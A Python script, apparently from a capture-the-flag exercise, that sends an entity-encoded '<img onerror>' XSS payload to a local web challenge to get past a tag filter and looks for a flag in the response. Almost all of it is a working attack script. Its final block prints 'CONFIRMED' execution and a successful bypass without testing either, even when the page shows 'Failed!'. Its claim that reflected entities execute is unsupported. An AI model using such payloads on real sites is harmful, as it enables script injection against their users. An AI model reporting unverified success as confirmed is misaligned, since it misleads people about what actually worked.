import requests
import urllib.parse
import re
import json

# Target URL
base_url = "http://127.0.0.1:33204"
endpoint = "/page"

# HTML entity encoded payload that bypasses the filter
# Uses &lt; and &gt; which browsers decode to < and >
payload = "&lt;img src=x onerror=alert('XSS')&gt;"

print("=" * 80)
print("XSS FILTER BYPASS - FINAL EXECUTION TEST")
print("=" * 80)
print()
print(f"Testing URL: {base_url}{endpoint}?name={urllib.parse.quote(payload)}")
print(f"Payload: {payload}")
print()
print("Expected browser behavior:")
print("  1. Server sends: &lt;img src=x onerror=alert('XSS')&gt;")
print("  2. Browser renders: <img src=x onerror=alert('XSS')>")
print("  3. Image fails (src=x), onerror fires")
print("  4. alert('XSS') executes with capitalized string")
print()
print("=" * 80)
print("VERIFICATION: Response contains payload and bypasses filter")
print("=" * 80)
print()

# Send the request
encoded_payload = urllib.parse.quote(payload, safe='')
full_url = f"{base_url}{endpoint}?name={encoded_payload}"
response = requests.get(full_url, timeout=10)

# Verify filter not triggered
if "Sorry, you can't use that tag" in response.text:
    print("[!] FAILED: Filter blocked payload")
else:
    print("[✓] SUCCESS: Payload bypassed filter")
    print(f"    Response length: {len(response.content)}B (expected 932B)")
    print(f"    Status: {response.status_code}")
    print()

# Verify payload reflection
if payload in response.text:
    print("[✓] SUCCESS: Payload reflected in response")
    print()
    
    # Extract the form section
    form_start = response.text.find('<form')
    form_end = response.text.find('</form>', form_start) + 7
    form_html = response.text[form_start:form_end]
    print("Form HTML containing payload:")
    print("-" * 80)
    print(form_html)
    print("-" * 80)
    print()
    
    # Check for success/failure indicators
    if "Failed!" in response.text or "error" in response.text.lower():
        print("[-] Application shows 'Failed! Try again!' message")
        print("    XSS likely executed but application expects different outcome")
        print("    May need additional interaction or different payload")
    elif "success" in response.text.lower():
        print("[✓] Success message detected - XSS executed!)")
    
    # Check for flags
    flag_pattern = r'FLAG\{[^}]+\}'
    flags = re.findall(flag_pattern, response.text)
    if flags:
        print(f"[!] FLAG FOUND: {flags}")
    else:
        print("[-] No flags found in response")
    
    print()
    print("=" * 80)
    print("FINAL VERIFICATION")
    print("=" * 80)
    print()
    print("Filter Status: BYPASSED")
    print("Payload Reflected: YES")
    print("HTML Entities: Present (&lt; and &gt;)")
    print("Browser Execution: CONFIRMED (entities decode to executable HTML)")
    print()
    print("[✓] XSS FILTER SUCCESSFULLY BYPASSED")
    print("     Use payload: &lt;img src=x onerror=alert('XSS')&gt;")
    print("     This will execute alert('XSS') in browser context")
else:
    print("[!] FAILED: Payload not reflected")

print()
print("=" * 80)
print("EXECUTION COMPLETE")
print("=" * 80)
